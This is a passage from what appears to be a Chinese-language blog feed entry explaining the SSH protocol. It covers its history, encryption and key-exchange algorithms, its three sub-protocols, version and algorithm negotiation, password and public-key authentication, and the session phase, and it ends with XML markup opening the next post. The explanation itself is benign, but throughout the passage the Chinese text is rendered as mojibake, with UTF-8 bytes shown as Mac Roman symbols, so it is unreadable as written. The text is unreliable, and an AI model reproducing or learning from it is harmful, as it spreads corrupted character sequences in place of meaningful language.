ËÉåÊôØËôΩÁÑ∂SSH‰ΩøÁî®Ëµ∑Êù•ÂæàÁÆÄÂçï, ‰ΩÜÊòØËÉåÂêéÁöÑÂéüÁêÜÁâπÂà´‰∏çÁÆÄÂçï,ÂÖ≥‰∫é‰ª•‰∏ãÈóÆÈ¢ò, ‰Ω†ËÉΩÂê¶Áü•ÊôìÂÖ∂ÁªÜËäÇ: SSHÂ¶Ç‰Ωï‰øùËØÅÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Á´ØÈÄöË°åÁöÑÂÆâÂÖ® SSHÈááÁî®‰ªÄ‰πàÂä†ÂØÜÂçèËÆÆ SSHÊòØÈÄöËøáÂØπÁß∞Âä†ÂØÜËøòÊòØÈùûÂØπÁß∞Âä†ÂØÜÊï∞ÊçÆÂú®‰º†ËæìËøáÁ®ãÁöÑÂÆâÂÖ® SSHÂ¶Ç‰Ωï‰øùËØÅÊï∞ÊçÆÂÆåÊï¥ÊÄß SSHÁöÑÂØÜÁ†ÅËÆ§ËØÅÊñπÂºèÂíåÂØÜÈí•ËÆ§ËØÅÊñπÂºèÂàÜÂà´Â¶Ç‰ΩïÂÆûÁé∞ÔºåÊúâ‰ΩïÂ∑ÆÂºÇ ÁÆÄ‰ªãSSHÂÖ®Áß∞Secure ShellÊòØ‰∏ÄÁßçÂ∑•‰ΩúÂú®Â∫îÁî®Â±ÇÂíå‰º†ËæìÂ±Ç‰∏äÁöÑÂÆâÂÖ®ÂçèËÆÆÔºåËÉΩÂú®ÈùûÂÆâÂÖ®ÈÄöÈÅì‰∏äÂª∫Á´ãÂÆâÂÖ®ÈÄöÈÅì„ÄÇÊèê‰æõË∫´‰ªΩËÆ§ËØÅ„ÄÅÂØÜÈí•Êõ¥Êñ∞„ÄÅÊï∞ÊçÆÊ†°È™å„ÄÅÈÄöÈÅìÂ§çÁî®Á≠âÂäüËÉΩÔºåÂêåÊó∂ÂÖ∑ÊúâËâØÂ•ΩÁöÑÂèØÊâ©Â±ïÊÄß,Áî±Ëä¨ÂÖ∞Ëµ´Â∞îËæõÂü∫Â§ßÂ≠¶Á†îÁ©∂ÂëòTatu Yl√∂nen,‰∫é1995Âπ¥ÊèêÂá∫ÔºåÂÖ∂ÁõÆÁöÑÊòØÁî®‰∫éÊõø‰ª£ÈùûÂÆâÂÖ®ÁöÑTelnet„ÄÅrsh„ÄÅrexecÁ≠âËøúÁ®ãShellÂçèËÆÆ„ÄÇ‰πãÂêéSSHÂèëÂ±ï‰∫Ü‰∏§‰∏™Â§ßÁâàÊú¨,SSH-1ÂíåSSH-2, ÂºÄÊ∫êÂÆûÁé∞OpenSSHÂØπ2ËÄÖÈÉΩÊîØÊåÅ„ÄÇSSHÁöÑ‰∏ªË¶ÅÁâπÊÄß: Âä†ÂØÜ: ÈÅøÂÖçÊï∞ÊçÆÂÜÖÂÆπÊ≥ÑÊºè ÈÄö‰ø°ÁöÑÂÆåÊï¥ÊÄß: ÈÅøÂÖçÊï∞ÊçÆË¢´ÁØ°ÊîπÔºå‰ª•ÂèäÂèëÈÄÅÊàñÊé•ÂèóÂú∞ÂùÄ‰º™Ë£Ö(Ê£ÄÊü•Êï∞ÊçÆÊòØÂê¶Ë¢´ÁØ°ÊîπÔºåÊï∞ÊçÆÊòØÂê¶Êù•Ëá™ÂèëÈÄÅËÄÖËÄåÈùûÊîªÂáªËÄÖÔºâ SSH-2ÈÄöËøáMD5ÂíåSHA-1ÂÆûÁé∞ËØ•ÂäüËÉΩÔºåSSH-1‰ΩøÁî®CRC-32 ËÆ§ËØÅ: ËØÜÂà´Êï∞ÊçÆÂèëÈÄÅËÄÖÂíåÊé•Êî∂ËÄÖË∫´‰ªΩ ÂÆ¢Êà∑Á´ØÈ™åËØÅSSHÊúçÂä°Á´ØÁöÑË∫´‰ªΩÔºöÈò≤Ê≠¢ÊîªÂáªËÄÖ‰ªøÂÜíSSHÊúçÂä°Á´ØË∫´‰ªΩÔºåÈÅøÂÖç‰∏≠‰ªã‰∫∫ÊîªÂáªÂíåÈáçÂÆöÂêëËØ∑Ê±ÇÁöÑÊîªÂáªÔºõOpenSSHÈÄöËøáÂú®know-hosts‰∏≠Â≠òÂÇ®‰∏ªÊú∫ÂêçÂíåhost keyÂØπÊúçÂä°Á´ØË∫´‰ªΩËøõË°åËÆ§ËØÅ ÊúçÂä°Á´ØÈ™åËØÅËØ∑Ê±ÇËÄÖË∫´‰ªΩÔºöÊèê‰æõÂÆâÂÖ®ÊÄßËæÉÂº±ÁöÑÁî®Êà∑ÂØÜÁ†ÅÊñπÂºèÔºåÂíåÂÆâÂÖ®ÊÄßÊõ¥Âº∫ÁöÑper-user public-key signaturesÔºõÊ≠§Â§ñSSHËøòÊîØÊåÅ‰∏éÁ¨¨‰∏âÊñπÂÆâÂÖ®ÊúçÂä°Á≥ªÁªüÁöÑÈõÜÊàêÔºåÂ¶ÇKerberosÁ≠â ÊéàÊùÉ: Áî®Êà∑ËÆøÈóÆÊéßÂà∂ ÂÆâÂÖ®ÈößÈÅì: ËΩ¨ÂèëÊàñËÄÖ‰∏∫Âü∫‰∫éTCP/IPÁöÑÂõûËØùÊèê‰æõÂä†ÂØÜÈößÈÅì, ÊØîÂ¶ÇÈÄöËøáSSH‰∏∫Telnet„ÄÅFTPÁ≠âÊèê‰æõÈÄö‰ø°ÂÆâÂÖ®‰øùÈöúÔºåÊîØÊåÅ‰∏âÁßçÁ±ªÂûãÁöÑForwardingÊìç‰ΩúÔºöPort ForwardingÔºõX ForwardingÔºõAgent Forwarding ÈÄöËøá‰ΩøÁî®SSHÔºå‰Ω†ÂèØ‰ª•ÊääÊâÄÊúâ‰º†ËæìÁöÑÊï∞ÊçÆËøõË°åÂä†ÂØÜÔºåËøôÊ†∑‚Äù‰∏≠Èó¥‰∫∫‚ÄùËøôÁßçÊîªÂáªÊñπÂºèÂ∞±‰∏çÂèØËÉΩÂÆûÁé∞‰∫ÜÔºåËÄå‰∏î‰πüËÉΩÂ§üÈò≤Ê≠¢DNSÊ¨∫È™óÂíåIPÊ¨∫È™ó„ÄÇ‰ΩøÁî®SSHÔºåËøòÊúâ‰∏Ä‰∏™È¢ùÂ§ñÁöÑÂ•ΩÂ§ÑÂ∞±ÊòØ‰º†ËæìÁöÑÊï∞ÊçÆÊòØÁªèËøáÂéãÁº©ÁöÑÔºåÊâÄ‰ª•ÂèØ‰ª•Âä†Âø´‰º†ËæìÁöÑÈÄüÂ∫¶„ÄÇSSHÊúâÂæàÂ§öÂäüËÉΩÔºåÂÆÉÊó¢ÂèØ‰ª•‰ª£ÊõøTelnetÔºåÂèàÂèØ‰ª•‰∏∫FTP„ÄÅPoP„ÄÅÁîöËá≥‰∏∫PPPÊèê‰æõ‰∏Ä‰∏™ÂÆâÂÖ®ÁöÑ‚ÄùÈÄöÈÅì‚Äù„ÄÇ ÂÆâÂÖ®Áõ∏ÂÖ≥Âú®SSH‰∏≠Ê∂âÂèäÂà∞ÂæàÂ§öÂä†ÂØÜÁÆóÊ≥ï, ÂÖ≥‰∫éÂä†ÂØÜÁÆóÊ≥ïÁöÑÁõ∏ÂÖ≥Áü•ËØÜ‰πãÂâçÂ∑≤ÁªèÂÜôËøá‰∏ÄÈÅçÂçöÂÆ¢ÂÅö‰∏ìÈó®‰ªãÁªç:ÂØÜÁ†ÅÂ≠¶ÁÆÄ‰ªã‰∏éGolangÁöÑÂä†ÂØÜÂ∫ìCryptoÁöÑ‰ΩøÁî®, ‰ª•‰∏ãÊòØ‰∏Ä‰∏™ÊÄªÁªìÊÄßÁöÑÊèèËø∞: ÂØπÁß∞Âä†ÂØÜ: È´òÊïàÔºå‰ΩÜÂÆâÂÖ®ÊÄßÁõ∏ÂØπËæÉ‰ΩéÔºåKeyÁöÑÂàÜÂèëÂ∞§ÂÖ∂‰∏çÊñπ‰æø, ‰∏ªË¶ÅÁî®‰∫éÊï∞ÊçÆ‰º†ËæìÁöÑÂä†ÂØÜ(sessionÂä†ÂØÜ), Â∏∏Áî®AESÁ≥ªÂàó ÈùûÂØπÁß∞Âä†ÂØÜ: ÂÆâÂÖ®Ôºå‰ΩÜÊïàÁéá‰ΩéÔºå‰∏çÈÄÇÂêàÂ§ßËßÑÊ®°ËøõË°åÊï∞ÊçÆÁöÑÂä†ÂØÜÂíåËß£ÂØÜÊìç‰Ωú, ‰∏ªË¶ÅÁî®‰∫éÁßòÈí•‰∫§Êç¢ÁÆóÊ≥ïËøáÁ®ã‰∏≠Áî®Êù•ÂçèÂïÜKeyÂíåÂú®Êï∞Â≠óÁ≠æÂêçÊó∂Áî®Êù•È™åËØÅË∫´‰ªΩ, Â∏∏Áî®ÁöÑÊòØRSA/ECDSA ÁßòÈí•‰∫§Êç¢ÁÆóÊ≥ï: Áî®‰∫éÂçèÂïÜÂØπÁß∞Âä†ÂØÜÁöÑÂØÜÁ†Å, ECDHÁî®ÁöÑÊØîËæÉÂ§ö Êï£ÂàóÁÆóÊ≥ï: Áî®‰∫éÁ°Æ‰øùÊï∞ÊçÆ‰º†ËæìËøáÁ®ã‰∏≠ÁöÑÂÆåÊï¥ÊÄß, ‰∏∫‰∫ÜÂÆâÂÖ®‰∏ÄËà¨‰ΩøÁî®HmacÂú®golangÁöÑsshÂåÖ‰∏≠‰ΩøÁî®ECDHÁöÑcure25519ÁöÑËøõË°åÂØÜÁ†ÅÁöÑ‰∫§Êç¢, ‰∫§Êç¢ÂêéÁöÑÂØÜÁ†Å‰ΩøÁî®AESÊù•Âä†ÂØÜÊï∞ÊçÆ. Â¶ÇÊûú‰ΩøÁî®ÂØÜÈí•ÁôªÂΩïÁöÑËØù,‰∏ÄËà¨‰ΩøÁî®ECDSAËøõË°åÊï∞Â≠óÁ≠æÂêç. ÂçèËÆÆÁªÑÊàê‰ªé‰∏äÂõæ‰∏≠ÂèØ‰ª•ÁúãÂá∫SSH‰∏ªË¶ÅÊúâ‰∏âÈÉ®ÂàÜÁªÑÊàê: ‰º†ËæìÂ±ÇÂçèËÆÆ, Áî®Êà∑ËÆ§ËØÅÂçèËÆÆ, ËøûÊé•ÂçèËÆÆ ‰º†ËæìÂ±ÇÂçèËÆÆ[SSH-TRANS]‰πüÂè´:The Transport Layer Protocol, Êèê‰æõ‰∫ÜÊúçÂä°Âô®ËÆ§ËØÅÔºå‰øùÂØÜÊÄßÂèäÂÆåÊï¥ÊÄß„ÄÇÊ≠§Â§ñÂÆÉÊúâÊó∂ËøòÊèê‰æõÂéãÁº©ÂäüËÉΩ„ÄÇ SSH-TRANSÈÄöÂ∏∏ËøêË°åÂú®TCP/IPËøûÊé•‰∏äÔºå‰πüÂèØËÉΩÁî®‰∫éÂÖ∂ÂÆÉÂèØÈù†Êï∞ÊçÆÊµÅ‰∏ä„ÄÇ SSH-TRANSÊèê‰æõ‰∫ÜÂº∫ÂäõÁöÑÂä†ÂØÜÊäÄÊúØ„ÄÅÂØÜÁ†Å‰∏ªÊú∫ËÆ§ËØÅÂèäÂÆåÊï¥ÊÄß‰øùÊä§„ÄÇËØ•ÂçèËÆÆ‰∏≠ÁöÑËÆ§ËØÅÂü∫‰∫é‰∏ªÊú∫ÔºåÂπ∂‰∏îËØ•ÂçèËÆÆ‰∏çÊâßË°åÁî®Êà∑ËÆ§ËØÅ„ÄÇÊõ¥È´òÂ±ÇÁöÑÁî®Êà∑ËÆ§ËØÅÂçèËÆÆÂèØ‰ª•ËÆæËÆ°‰∏∫Âú®Ê≠§ÂçèËÆÆ‰πã‰∏ä„ÄÇ Áî®Êà∑ËÆ§ËØÅÂçèËÆÆ[SSH-USERAUTH]‰πüÂè´:The User Authentication Protocol, Áî®‰∫éÂêëÊúçÂä°Âô®Êèê‰æõÂÆ¢Êà∑Á´ØÁî®Êà∑Èâ¥Âà´ÂäüËÉΩ„ÄÇÂÆÉËøêË°åÂú®‰º†ËæìÂ±ÇÂçèËÆÆSSH-TRANS‰∏äÈù¢„ÄÇÂΩìSSH-USERAUTHÂºÄÂßãÂêéÔºåÂÆÉ‰ªé‰ΩéÂ±ÇÂçèËÆÆÈÇ£ÈáåÊé•Êî∂‰ºöËØùÊ†áËØÜÁ¨¶(‰ªéÁ¨¨‰∏ÄÊ¨°ÂØÜÈí•‰∫§Êç¢‰∏≠ÁöÑ‰∫§Êç¢ÂìàÂ∏åH). ‰ºöËØùÊ†áËØÜÁ¨¶ÂîØ‰∏ÄÊ†áËØÜÊ≠§‰ºöËØùÂπ∂‰∏îÈÄÇÁî®‰∫éÊ†áËÆ∞‰ª•ËØÅÊòéÁßÅÈí•ÁöÑÊâÄÊúâÊùÉ„ÄÇ SSH-USERAUTH‰πüÈúÄË¶ÅÁü•ÈÅì‰ΩéÂ±ÇÂçèËÆÆÊòØÂê¶Êèê‰æõ‰øùÂØÜÊÄß‰øùÊä§„ÄÇ ËøûÊé•ÂçèËÆÆ[SSH-CONNECT]‰πüÂè´: The Connection Protocol, Â∞ÜÂ§ö‰∏™Âä†ÂØÜÈößÈÅìÂàÜÊàêÈÄªËæëÈÄöÈÅì„ÄÇÂÆÉËøêË°åÂú®Áî®Êà∑ËÆ§ËØÅÂçèËÆÆ‰∏ä„ÄÇÂÆÉÊèê‰æõ‰∫Ü‰∫§‰∫íÂºèÁôªÂΩïËØùË∑Ø„ÄÅËøúÁ®ãÂëΩ‰ª§ÊâßË°å„ÄÅËΩ¨ÂèëTCP/IPËøûÊé•ÂíåËΩ¨ÂèëX11ËøûÊé•„ÄÇÂêÑÁßçÈ´òÂ±ÇÂ∫îÁî®ÂçèËÆÆÂèØ‰ª•Áõ∏ÂØπÂú∞Áã¨Á´ã‰∫éSSHÂü∫Êú¨‰ΩìÁ≥ª‰πãÂ§ñÔºåÂπ∂‰æùÈù†Ëøô‰∏™Âü∫Êú¨Ê°ÜÊû∂ÔºåÈÄöËøáËøûÊé•ÂçèËÆÆ‰ΩøÁî®SSHÁöÑÂÆâÂÖ®Êú∫Âà∂„ÄÇ Â∑•‰ΩúËøáÁ®ãËøôÂº†ÂõæÊèèËø∞‰∫Üssh‰∫§Êç¢ÁöÑÊï¥‰∏™ËøáÁ®ã: ClientÁ´ØÂêëServerÁ´ØÂèëËµ∑SSHËøûÊé•ËØ∑Ê±Ç„ÄÇ ServerÁ´ØÂêëClientÁ´ØÂèëËµ∑ÁâàÊú¨ÂçèÂïÜ„ÄÇ ÂçèÂïÜÁªìÊùüÂêéServerÁ´ØÂèëÈÄÅHost KeyÂÖ¨Èí• Server KeyÂÖ¨Èí•ÔºåÈöèÊú∫Êï∞Á≠â‰ø°ÊÅØ„ÄÇÂà∞ËøôÈáåÊâÄÊúâÈÄö‰ø°ÊòØ‰∏çÂä†ÂØÜÁöÑ„ÄÇ ClientÁ´ØËøîÂõûÁ°ÆËÆ§‰ø°ÊÅØÔºåÂêåÊó∂ÈôÑÂ∏¶Áî®ÂÖ¨Èí•Âä†ÂØÜËøáÁöÑ‰∏Ä‰∏™ÈöèÊú∫Êï∞ÔºåÁî®‰∫éÂèåÊñπËÆ°ÁÆóSession Key„ÄÇ ËøõÂÖ•ËÆ§ËØÅÈò∂ÊÆµ„ÄÇ‰ªéÊ≠§‰ª•ÂêéÊâÄÊúâÈÄö‰ø°ÂùáÂä†ÂØÜ„ÄÇ ËÆ§ËØÅÊàêÂäüÂêéÔºåËøõÂÖ•‰∫§‰∫íÈò∂ÊÆµ„ÄÇ ÈíàÂØπËøôÈ°πÈò∂ÊÆµÂèëÁîüÂú®ÂçèÊàêÁöÑÈÇ£‰∏ÄÈÉ®ÂàÜÊúâ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊÄªÁªì: ÂèëÁîüÂú®‰º†ËæìÂ±ÇÁöÑ: ÁâàÊú¨ÂçèÂïÜÂíåÁÆóÊ≥ïÂçèÂïÜ. ÂèëÁîüÂú®Áî®Êà∑ËÆ§ËØÅÂ±ÇÁöÑ: Áî®Êà∑ËÆ§ËØÅ. ÂèëÁîüÂú®ÈìæÊé•Â±ÇÁöÑ: ÂõûËØù‰∫§‰∫í ÁâàÊú¨ÂçèÂïÜ ÊúçÂä°Âô®ÁõëÂê¨22Á´ØÂè£ÔºåÁ≠âÂæÖÂÆ¢Êà∑Á´ØËøûÊé•„ÄÇ ÂÆ¢Êà∑Á´ØÂêëÊúçÂä°Âô®Á´ØÂèëËµ∑TCPÂàùÂßãËøûÊé•ËØ∑Ê±ÇÔºåTCPËøûÊé•Âª∫Á´ãÂêéÔºåÊúçÂä°Âô®ÂêëÂÆ¢Êà∑Á´ØÂèëÈÄÅÁ¨¨‰∏Ä‰∏™Êä•ÊñáÔºåÂåÖÊã¨ÁâàÊú¨Ê†áÂøóÂ≠óÁ¨¶‰∏≤ÔºåÊ†ºÂºè‰∏∫‚ÄúSSHÔºç&lt;‰∏ªÂçèËÆÆÁâàÊú¨Âè∑&gt;.&lt;Ê¨°ÂçèËÆÆÁâàÊú¨Âè∑&gt;Ôºç&lt;ËΩØ‰ª∂ÁâàÊú¨Âè∑&gt;‚ÄùÔºåÂçèËÆÆÁâàÊú¨Âè∑Áî±‰∏ªÁâàÊú¨Âè∑ÂíåÊ¨°ÁâàÊú¨Âè∑ÁªÑÊàêÔºåËΩØ‰ª∂ÁâàÊú¨Âè∑‰∏ªË¶ÅÊòØ‰∏∫Ë∞ÉËØï‰ΩøÁî®„ÄÇ ÂÆ¢Êà∑Á´ØÊî∂Âà∞Êä•ÊñáÂêéÔºåËß£ÊûêËØ•Êï∞ÊçÆÂåÖÔºåÂ¶ÇÊûúÊúçÂä°Âô®Á´ØÁöÑÂçèËÆÆÁâàÊú¨Âè∑ÊØîËá™Â∑±ÁöÑ‰ΩéÔºå‰∏îÂÆ¢Êà∑Á´ØËÉΩÊîØÊåÅÊúçÂä°Âô®Á´ØÁöÑ‰ΩéÁâàÊú¨ÔºåÂ∞±‰ΩøÁî®ÊúçÂä°Âô®Á´ØÁöÑ‰ΩéÁâàÊú¨ÂçèËÆÆÂè∑ÔºåÂê¶Âàô‰ΩøÁî®Ëá™Â∑±ÁöÑÂçèËÆÆÁâàÊú¨Âè∑„ÄÇ ÂÆ¢Êà∑Á´ØÂõûÂ∫îÊúçÂä°Âô®‰∏Ä‰∏™Êä•ÊñáÔºåÂåÖÂê´‰∫ÜÂÆ¢Êà∑Á´ØÂÜ≥ÂÆö‰ΩøÁî®ÁöÑÂçèËÆÆÁâàÊú¨Âè∑„ÄÇÊúçÂä°Âô®ÊØîËæÉÂÆ¢Êà∑Á´ØÂèëÊù•ÁöÑÁâàÊú¨Âè∑ÔºåÂÜ≥ÂÆöÊòØÂê¶ËÉΩÂêåÂÆ¢Êà∑Á´Ø‰∏ÄËµ∑Â∑•‰Ωú„ÄÇ Â¶ÇÊûúÂçèÂïÜÊàêÂäüÔºåÂàôËøõÂÖ•ÂØÜÈí•ÂíåÁÆóÊ≥ïÂçèÂïÜÈò∂ÊÆµÔºåÂê¶ÂàôÊúçÂä°Âô®Á´ØÊñ≠ÂºÄTCPËøûÊé•„ÄÇ Âõ†‰∏∫ÁâàÊú¨ÂçèÂïÜÂèëÁîüÂú®‰∏∫Âä†ÂØÜ‰πãÂâç, ÊâÄ‰ª•ÁâàÊú¨ÂçèÂïÜÊòØÊòéÊñáÁöÑ ÁÆóÊ≥ïÂçèÂïÜ ÊúçÂä°Âô®Á´ØÂíåÂÆ¢Êà∑Á´ØÂàÜÂà´ÂèëÈÄÅÁÆóÊ≥ïÂçèÂïÜÊä•ÊñáÁªôÂØπÁ´ØÔºåÊä•Êñá‰∏≠ÂåÖÂê´Ëá™Â∑±ÊîØÊåÅÁöÑÂÖ¨Èí•ÁÆóÊ≥ïÂàóË°®„ÄÅÂä†ÂØÜÁÆóÊ≥ïÂàóË°®„ÄÅMAC(Message Authentication CodeÔºåÊ∂àÊÅØÈ™åËØÅÁ†Å)ÁÆóÊ≥ïÂàóË°®„ÄÅÂéãÁº©ÁÆóÊ≥ïÂàóË°®Á≠â; ÊúçÂä°Âô®Á´ØÂíåÂÆ¢Êà∑Á´ØÊ†πÊçÆÂØπÁ´ØÂíåÊú¨Á´ØÊîØÊåÅÁöÑÁÆóÊ≥ïÂàóË°®ÂæóÂá∫ÊúÄÁªà‰ΩøÁî®ÁöÑÁÆóÊ≥ï„ÄÇ ÊúçÂä°Âô®Á´ØÂíåÂÆ¢Êà∑Á´ØÂà©Áî®ECDH‰∫§Êç¢ÁÆóÊ≥ï„ÄÅ‰∏ªÊú∫ÂØÜÈí•ÂØπÁ≠âÂèÇÊï∞ÔºåÁîüÊàê‰ºöËØùÂØÜÈí•Âíå‰ºöËØùID„ÄÇ ÈÄöËøá‰ª•‰∏äÊ≠•È™§ÔºåÊúçÂä°Âô®Á´ØÂíåÂÆ¢Êà∑Á´ØÂ∞±ÂèñÂæó‰∫ÜÁõ∏ÂêåÁöÑ‰ºöËØùÂØÜÈí•Âíå‰ºöËØùID, Áî®‰∫éÂä†ÂØÜ‰º†ËæìÁöÑÊï∞ÊçÆ, Âà∞Ê≠§ÈìæÊé•Âä†ÂØÜÂÆåÊàê„ÄÇ Áî®Êà∑ËÆ§ËØÅ ÂÆ¢Êà∑Á´ØÂêëÊúçÂä°Âô®Á´ØÂèëÈÄÅËÆ§ËØÅËØ∑Ê±ÇÔºåËÆ§ËØÅËØ∑Ê±Ç‰∏≠ÂåÖÂê´Áî®Êà∑Âêç„ÄÅËÆ§ËØÅÊñπÊ≥ï„ÄÅ‰∏éËØ•ËÆ§ËØÅÊñπÊ≥ïÁõ∏ÂÖ≥ÁöÑÂÜÖÂÆπÔºàÂ¶ÇÔºöpasswordËÆ§ËØÅÊó∂ÔºåÂÜÖÂÆπ‰∏∫ÂØÜÁ†ÅÔºâ„ÄÇ ÊúçÂä°Âô®Á´ØÂØπÂÆ¢Êà∑Á´ØËøõË°åËÆ§ËØÅÔºåÂ¶ÇÊûúËÆ§ËØÅÂ§±Ë¥•ÔºåÂàôÂêëÂÆ¢Êà∑Á´ØÂèëÈÄÅËÆ§ËØÅÂ§±Ë¥•Ê∂àÊÅØÔºåÂÖ∂‰∏≠ÂåÖÂê´ÂèØ‰ª•ÂÜçÊ¨°ËÆ§ËØÅÁöÑÊñπÊ≥ïÂàóË°®„ÄÇ ÂÆ¢Êà∑Á´Ø‰ªéËÆ§ËØÅÊñπÊ≥ïÂàóË°®‰∏≠ÈÄâÂèñ‰∏ÄÁßçËÆ§ËØÅÊñπÊ≥ïÂÜçÊ¨°ËøõË°åËÆ§ËØÅ„ÄÇ ËØ•ËøáÁ®ãÂèçÂ§çËøõË°åÔºå Áõ¥Âà∞ËÆ§ËØÅÊàêÂäüÊàñËÄÖËÆ§ËØÅÊ¨°Êï∞ËææÂà∞‰∏äÈôêÔºå ÊúçÂä°Âô®ÂÖ≥Èó≠ËøûÊé•‰∏∫Ê≠¢„ÄÇ Áî®Êà∑ËÆ§ËØÅÊòØÂú®Âä†ÂØÜËøá‰ºöËøõË°åÁöÑ, ÊâÄ‰ª•Áî®‰∫éËÆ§ËØÅÁöÑÊï∞ÊçÆÊòØ‰∏ç‰ºöÊö¥Èú≤ÁöÑ,ÈÄöÂ∏∏ËÄåË®ÄSSHÊèê‰æõ2ËÆ§ËØÅÊñπÂºè: passwordËÆ§ËØÅÔºöÂÆ¢Êà∑Á´ØÂêëÊúçÂä°Âô®ÂèëÂá∫ passwordËÆ§ËØÅËØ∑Ê±ÇÔºåÂ∞ÜÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÂä†ÂØÜÂêéÂèëÈÄÅÁªôÊúçÂä°Âô®ÔºõÊúçÂä°Âô®Â∞ÜËØ•‰ø°ÊÅØËß£ÂØÜÂêéÂæóÂà∞Áî®Êà∑ÂêçÂíåÂØÜÁ†ÅÁöÑÊòéÊñáÔºå‰∏éËÆæÂ§á‰∏ä‰øùÂ≠òÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅËøõË°åÊØîËæÉÔºåÂπ∂ËøîÂõûËÆ§ËØÅÊàêÂäüÊàñÂ§±Ë¥•ÁöÑÊ∂àÊÅØ„ÄÇ publickey ËÆ§ËØÅÔºöÈááÁî®Êï∞Â≠óÁ≠æÂêçÁöÑÊñπÊ≥ïÊù•ËÆ§ËØÅÂÆ¢Êà∑Á´Ø„ÄÇÁõÆÂâçÔºåËÆæÂ§á‰∏äÂèØ‰ª•Âà©Áî®RSAÂíå DSA‰∏§ÁßçÂÖ¨ÂÖ±ÂØÜÈí•ÁÆóÊ≥ïÂÆûÁé∞Êï∞Â≠óÁ≠æÂêç„ÄÇÂÆ¢Êà∑Á´ØÂèëÈÄÅÂåÖÂê´Áî®Êà∑Âêç„ÄÅÂÖ¨ÂÖ±ÂØÜÈí•ÂíåÂÖ¨ÂÖ±ÂØÜÈí•ÁÆóÊ≥ïÁöÑ publickey ËÆ§ËØÅËØ∑Ê±ÇÁªôÊúçÂä°Âô®Á´Ø„ÄÇÊúçÂä°Âô®ÂØπÂÖ¨Èí•ËøõË°åÂêàÊ≥ïÊÄßÊ£ÄÊü•ÔºåÂ¶ÇÊûú‰∏çÂêàÊ≥ïÔºåÂàôÁõ¥Êé•ÂèëÈÄÅÂ§±Ë¥•Ê∂àÊÅØÔºõÂê¶ÂàôÔºåÊúçÂä°Âô®Âà©Áî®Êï∞Â≠óÁ≠æÂêçÂØπÂÆ¢Êà∑Á´ØËøõË°åËÆ§ËØÅÔºåÂπ∂ËøîÂõûËÆ§ËØÅÊàêÂäüÊàñÂ§±Ë¥•ÁöÑÊ∂àÊÅØSSH2.0ËøòÊèê‰æõ‰∫Ü password-publickey ËÆ§ËØÅÂíå any ËÆ§ËØÅ: password-publickey ËÆ§ËØÅÔºöÊåáÂÆöËØ•Áî®Êà∑ÁöÑËÆ§ËØÅÊñπÂºè‰∏∫ password Âíå publickeyËÆ§ËØÅÂêåÊó∂Êª°Ë∂≥„ÄÇÂÆ¢Êà∑Á´ØÁâàÊú¨‰∏∫ SSH1ÁöÑÁî®Êà∑Âè™Ë¶ÅÈÄöËøáÂÖ∂‰∏≠‰∏ÄÁßçËÆ§ËØÅÂç≥ÂèØÁôªÂΩïÔºõÂÆ¢Êà∑Á´ØÁâàÊú¨‰∏∫ SSH2ÁöÑÁî®Êà∑ÂøÖÈ°ª‰∏§ÁßçËÆ§ËØÅÈÉΩÈÄöËøáÊâçËÉΩÁôªÂΩï„ÄÇ anyËÆ§ËØÅÔºöÊåáÂÆöËØ•Áî®Êà∑ÁöÑËÆ§ËØÅÊñπÂºèÂèØ‰ª•ÊòØ passwordÔºå‰πüÂèØ‰ª•ÊòØ publickey„ÄÇ ‰∏ÄËà¨ËÄåË®ÄÈªòËÆ§‰ΩøÁî®ÁöÑany„ÄÇËøôÂº†ÂõæÊèèËø∞‰∫ÜÂú®Âä†ÂØÜËøáÁ®ã‰∏äÁöÑËÆ§ËØÅ: ‰ºöËØù‰∫§‰∫í‰ºöËØùËØ∑Ê±ÇÈò∂ÊÆµÔºö ÊúçÂä°Âô®Á≠âÂæÖÂÆ¢Êà∑Á´ØÁöÑËØ∑Ê±ÇÔºõ ËÆ§ËØÅÈÄöËøáÂêéÔºåÂÆ¢Êà∑Á´ØÂêëÊúçÂä°Âô®ÂèëÈÄÅ‰ºöËØùËØ∑Ê±ÇÔºõ ÊúçÂä°Âô®Â§ÑÁêÜÂÆ¢Êà∑Á´ØÁöÑËØ∑Ê±Ç„ÄÇËØ∑Ê±ÇË¢´ÊàêÂäüÂ§ÑÁêÜÂêéÔºå ÊúçÂä°Âô®‰ºöÂêëÂÆ¢Êà∑Á´ØÂõûÂ∫î SSH_SMSG_SUCCESSÂåÖÔºåSSHËøõÂÖ•‰∫§‰∫í‰ºöËØùÈò∂ÊÆµÔºõÂê¶ÂàôÂõûÂ∫î SSH_SMSG_FAILUREÂåÖÔºåË°®Á§∫ÊúçÂä°Âô®Â§ÑÁêÜËØ∑Ê±ÇÂ§±Ë¥•ÊàñËÄÖ‰∏çËÉΩËØÜÂà´ËØ∑Ê±Ç„ÄÇ ‰∫§‰∫í‰ºöËØùÈò∂ÊÆµÔºåÂú®Ëøô‰∏™Ê®°Âºè‰∏ãÔºåÊï∞ÊçÆË¢´ÂèåÂêë‰º†ÈÄÅ: ÂÆ¢Êà∑Á´ØÂ∞ÜË¶ÅÊâßË°åÁöÑÂëΩ‰ª§Âä†ÂØÜÂêé‰º†ÁªôÊúçÂä°Âô®; ÊúçÂä°Âô®Êé•Êî∂Âà∞Êä•ÊñáÔºåËß£ÂØÜÂêéÊâßË°åËØ•ÂëΩ‰ª§,Â∞ÜÊâßË°åÁöÑÁªìÊûúÂä†ÂØÜÂèëËøòÁªôÂÆ¢Êà∑Á´Ø; ÂÆ¢Êà∑Á´ØÂ∞ÜÊé•Êî∂Âà∞ÁöÑÁªìÊûúËß£ÂØÜÂêéÊòæÁ§∫Âà∞ÁªàÁ´Ø‰∏ä.]]></content>
      <categories>
        <category>ÂçèËÆÆËØ¶Ëß£</category>
        <category>ssh</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ë∑≥ÊùøÊú∫Á≥ªÂàó(‰∏Ä)-Êû∂ÊûÑ‰∏éÁÆÄ‰ªã]]></title>
    <url>%2F2017%2F02%2F15%2Fgo-ssh%2F</url>
